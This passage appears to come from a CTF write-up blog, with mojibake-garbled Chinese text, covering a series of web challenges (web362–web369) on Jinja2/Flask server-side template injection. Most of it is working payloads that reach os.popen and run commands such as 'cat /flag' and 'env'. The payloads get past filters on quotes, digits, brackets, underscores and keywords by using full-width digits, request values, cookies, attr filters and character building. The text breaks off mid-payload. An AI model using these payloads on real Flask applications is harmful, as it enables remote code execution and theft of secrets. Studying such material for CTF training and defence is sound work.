half2full)</h4><p>ÁªèËøáÊµãËØïËøáÊª§‰∫ÜÊï∞Â≠ó2Âíå3Ôºå‰ΩÜÊòØÂèëÁé∞ÂèØ‰ª•140-8ÂìàÂìàÂìà</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">140</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÊúâÂ§ß‰Ω¨Êç¢Êàê‰∫ÜÂÖ®ËßíÊï∞Â≠ó‰πüÂèØ‰ª•</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">half2full</span><span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>      full <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">for</span> ch <span class="token keyword">in</span> half<span class="token punctuation">:</span>          <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>              ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xfee0</span><span class="token punctuation">)</span>          <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>              ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">pass</span>          full <span class="token operator">+=</span> ch      <span class="token keyword">return</span> full  t<span class="token operator">=</span><span class="token string">''</span>s<span class="token operator">=</span><span class="token string">"0123456789"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    t<span class="token operator">+=</span><span class="token string">'\''</span><span class="token operator">+</span>half2full<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\','</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span>Ôºê<span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>ÔºëÔºìÔºí<span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÊàñËÄÖ‰ΩøÁî®ÂÖ∂‰ªñÊñπÊ≥ï</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>x<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># x ÂèØ‰ª•‰∏∫‰ªªÊÑèËã±ÊñáÂ≠óÊØçÊàñÂ≠óÊØçÁªÑÂêà</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web363-ÂºïÂè∑"><a href="#web363-ÂºïÂè∑" class="headerlink" title="web363(ÂºïÂè∑)"></a>web363(ÂºïÂè∑)</h4><p>ËøáÊª§‰∫ÜÂçïÂºïÂè∑„ÄÅÂèåÂºïÂè∑</p><p><strong>GET‰º†ÂèÇÁªïËøá</strong></p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>os<span class="token operator">&amp;</span>b<span class="token operator">=</span>popen<span class="token operator">&amp;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p><strong>Â≠óÁ¨¶‰∏≤ÊãºÊé•ÁªïËøá</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'0'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'s'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'p'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'e'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'n'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'t'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'a'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">591</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'c'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">' '</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">853</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'/'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'f'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'l'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'g'</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment"># %2B -> +</span><span class="token comment"># ?name=&#123;&#123;url_for.__globals__['os']&#125;&#125;</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">591</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">853</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># ?name=&#123;&#123;url_for.__globals__['os']['popen']('tac /flag')&#125;&#125;</span></code></pre><p><strong>chrÊãºÊé•</strong></p><p>ÂÖàÊâæÂá∫ chr ÂáΩÊï∞ÔºåÂêåËøá chr ÊãºÊé•</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> <span class="token builtin">chr</span><span class="token operator">=</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">chr</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span>  url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre><p><strong>ÈÄöËøáËøáÊª§Âô®ÊãºÊé•</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>select<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span></code></pre><h4 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h4><p>Â§öËøáÊª§‰∫ÜargsÔºåÁî®‰∏ä‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÊãºÊé•‰πüÂèØ‰ª•</p><p>ËøáÊª§‰∫ÜÂçïÂèåÂºïÂè∑Ôºåargs</p><p>values ÂèØ‰ª•Ëé∑ÂèñÊâÄÊúâÂèÇÊï∞Ôºå‰ªéËÄåÁªïËøá args</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>ocean<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>ocean<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p>‰πüÂèØ‰ª•ÈÄöËøá cookie ÁªïËøá</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>a<span class="token operator">=</span>os<span class="token punctuation">;</span>b<span class="token operator">=</span>popen<span class="token punctuation">;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTIÊ®°ÊùøÊ≥®ÂÖ•ÁªïËøáÔºàËøõÈò∂ÁØáÔºâ</a></p><h4 id="web365-ËøáÊª§"><a href="#web365-ËøáÊª§" class="headerlink" title="web365(ËøáÊª§[])"></a>web365(ËøáÊª§[])</h4><p>fuzz Â≠óÂÖ∏Ë∑ë‰∏ÄÈÅçÔºåÂèëÁé∞ÂçïÂèåÂºïÂè∑„ÄÅargs„ÄÅ[]Ë¢´ËøáÊª§</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># GET‰º†ÂèÇ</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span class="token comment"># cookie</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Cookie<span class="token punctuation">:</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token comment"># __getitem__ ÂèØ‰ª•‰ª£ÊõøÊñπÊã¨Âè∑</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>xx<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>xxx<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Cookie<span class="token punctuation">:</span> x<span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">;</span>xx<span class="token operator">=</span>os<span class="token punctuation">;</span>xxx<span class="token operator">=</span>env</code></pre><h4 id="web366-ËøáÊª§-attr"><a href="#web366-ËøáÊª§-attr" class="headerlink" title="web366(ËøáÊª§__  attr)"></a>web366(ËøáÊª§__  attr)</h4><p>ËøáÊª§‰∫Ü<code>_</code> <code>&#39;</code> <code>&quot;</code> <code>[</code>      <code>|attr</code> ÂèØ‰ª£Êõø <code>.</code></p><p>Payload:</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><h4 id="web367-ËøáÊª§os"><a href="#web367-ËøáÊª§os" class="headerlink" title="web367(ËøáÊª§os)"></a>web367(ËøáÊª§os)</h4><p>Payload:</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>os<span class="token operator">&amp;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>ocean<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>ocean<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>__getitem__<span class="token operator">&amp;</span>c<span class="token operator">=</span>os<span class="token operator">&amp;</span>d<span class="token operator">=</span>popen<span class="token operator">&amp;</span>f<span class="token operator">=</span>read</code></pre><h4 id="web368-ËøáÊª§Âèå"><a href="#web368-ËøáÊª§Âèå" class="headerlink" title="web368(ËøáÊª§Âèå{)"></a>web368(ËøáÊª§Âèå{)</h4><p>ÂèØÁî® <code>&#123;%print(payload)%&#125;</code> ‰ª£Êõø <code>&#123;&#123;payload&#125;&#125;</code></p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>os<span class="token operator">&amp;</span>c<span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><h4 id="web369-ËøáÊª§request"><a href="#web369-ËøáÊª§request" class="headerlink" title="web369(ËøáÊª§request)"></a>web369(ËøáÊª§request)</h4><p>Ê≤°‰∫Ü requestÔºåË¶ÅËá™Â∑±ÊãºÂ≠óÁ¨¶‰∫Ü„ÄÇ</p><p><a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters">List of Builtin Filters</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>p<span class="token operator">=</span>a<span class="token punctuation">,</span>op<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#pop</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> lo<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">|</span>reject<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#_</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c1<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>ini<span class="token operator">=</span>a<span class="token punctuation">,</span>t<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__init__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c2<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>glo<span class="token operator">=</span>a<span class="token punctuation">,</span>bals<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__globals__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c3<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>get<span class="token operator">=</span>a<span class="token punctuation">,</span>item<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__getitem__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token 